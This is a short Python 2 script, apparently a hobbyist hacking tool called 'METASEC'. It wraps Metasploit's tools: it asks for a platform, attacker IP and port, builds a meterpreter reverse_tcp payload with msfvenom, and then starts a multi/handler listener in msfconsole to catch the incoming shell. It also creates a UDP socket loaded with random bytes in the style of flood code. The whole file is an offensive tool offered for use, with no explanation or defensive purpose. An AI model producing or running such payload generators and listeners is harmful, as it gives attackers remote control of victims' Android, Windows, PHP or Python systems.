import os,sys
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system ("figlet -f slant METASEC | lolcat -a")
time.sleep(3)
os.system ("clear")
os.system ("figlet PAYLOAD | lolcat")
print
print " BY : DEFALT "
print
la = raw_input ("android/python/php/windows : ")
ip = raw_input ("IP : ")
port = raw_input ("PORT : ")
out = raw_input ("OUTPUT : ")
os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s" % (la, ip, port, out))
os.system ("clear")
os.system ("figlet EXPLOIT | lolcat")
print
print " PROGRAM BY DEFALT "
print
la = raw_input ("android/python/php/windows : ")
ip = raw_input ("IP : ")
port = raw_input ("PORT : ")
os.system ("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD %s/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit;'" % (la, ip, port,))


